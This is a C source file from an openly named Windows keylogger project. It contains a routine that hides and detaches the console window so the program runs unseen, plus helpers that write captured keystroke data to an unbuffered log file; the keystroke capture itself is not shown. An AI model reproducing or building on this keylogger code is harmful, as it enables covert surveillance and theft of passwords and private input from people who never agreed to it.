﻿/* This file is part of bb-keylogger project.
*
* See the NOTICE file distributed with this work for copyright information.
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/

/*
* File:   bb-keylogger.c
* Author: Frapin Kevin
* Date:   22/03/2011
*
* DESCRIPTION
* -----------------------------------------------------------------------------
* File containing all the functions used to log the keystrokes.
* -----------------------------------------------------------------------------
*/

//---------------------------------------------------------------------- DEFINE
#define _WIN32_WINNT 0x0601

//------------------------------------------------------------- SYSTEM INCLUDES
#include <windows.h>

//---------------------------------------------------------- PERSONNAL INCLUDES
#include "includes/bb-keylogger.h"
#include "includes/bb-keylogger-keyboard.h"
#include "includes/bb-keylogger-system.h"
#include "includes/global.h"

//------------------------------------------------------------------- FUNCTIONS

void initialize_program(  )
{
	HWND hWnd = ( HWND ) GetConsoleWindow( );
	// Hide the console
	ShowWindow( hWnd, SW_HIDE );
	// Detach the process from the console
	FreeConsole( );
}

void log_infos( FILE * log_file, const char * format, ... )
{
	// Get the unamed parameters
	va_list arg_ptr;
	va_start( arg_ptr, format );
	
	// Log the infos
	vfprintf( log_file, format, arg_ptr );
	va_end( arg_ptr );
}

FILE * open_file( char * log_file_name )
{
	FILE * log_file = fopen( log_file_name, "a" );
	if( log_file == NULL )
	{
		exit( EXIT_FAILURE );
	}
	
	// No buffer, I/O ASAP
	setbuf ( log_file, NULL );
	
	return log_file;
}








